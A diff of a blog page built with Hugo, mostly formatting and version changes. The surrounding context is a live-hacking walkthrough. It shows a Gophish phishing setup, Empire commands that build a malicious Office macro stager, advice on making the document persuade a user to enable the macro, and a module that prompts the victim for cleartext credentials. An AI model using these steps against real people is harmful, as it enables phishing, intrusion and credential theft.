@@ -38,7 +38,8 @@
   
   
 
-  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  
+
   <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
   <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
 
@@ -50,7 +51,7 @@
   
   <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
 
-  <meta name="generator" content="Hugo 0.18.1" />
+  <meta name="generator" content="Hugo 0.37.1" />
   <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
   
   
@@ -150,10 +151,8 @@ This will be our command and control tool.</p>
 This tool is used to perform phishing attacks.
 Once the web interface working, configure the mail options and prepare a phishing mail template.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ dockerpull matteoggl/gophish
-$ docker run –ti –name gopish –p <span class="m">3333</span>:3333 –p <span class="m">8083</span>:80 matteoggl/gophish
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ dockerpull matteoggl/gophish
+$ docker run –ti –name gopish –p <span class="m">3333</span>:3333 –p <span class="m">8083</span>:80 matteoggl/gophish</code></pre></div>
 
 <p>Also, to create the backdoored Office document a version of Microsoft Office is necessary.</p>
 
@@ -166,7 +165,7 @@ Subsequently, the malicious macro can be created as a stager.
 The resulting script will be saved in a file to the disk.
 Copy the macro to the Windows box.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>&gt; listeners
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">&gt; listeners
 &gt; info
 &gt; <span class="nb">set</span> Name LiveHacking
 &gt; <span class="nb">set</span> Host http://127.0.0.1:8080
@@ -175,9 +174,7 @@ Copy the macro to the Windows box.</p>
 &gt; usestager makro officeMacro
 &gt; info
 &gt; <span class="nb">set</span> Listener LiveHacking
-&gt; execute
-</code></pre></div>
-
+&gt; execute</code></pre></div>
 
 <p>On Windows, create a Word document to hold the macro.
 Also adjust the visible contents to motivate the user to accept the macro.
@@ -220,11 +217,9 @@ Persistence is necessary if you want to establish a more permanent foothold.
 Finally, we also want to have to clear text credentials from the current user.
 To get those the collection/prompt module can be utilized.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>&gt; usemodule collection/prompt
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">&gt; usemodule collection/prompt
 &gt; info
-&gt; execute
-</code></pre></div>
-
+&gt; execute</code></pre></div>
 
 <h1 id="the-victim">The victim</h1>
 
@@ -250,7 +245,7 @@ Good thing that I am not in the movie business.</p>
 
 
 <div style="position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;">
-  <iframe src="//www.youtube.com/embed/F3RBZ5vM7GM" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" allowfullscreen frameborder="0"></iframe>
+  <iframe src="//www.youtube.com/embed/F3RBZ5vM7GM" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" allowfullscreen frameborder="0" title="YouTube Video"></iframe>
  </div>
 
 
@@ -284,7 +279,7 @@ Good thing that I am not in the movie business.</p>
 
 <footer>
 
-  <p class="text-muted credit">&copy; 2017. All rights reserved. </p>
+  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>
 
   
   
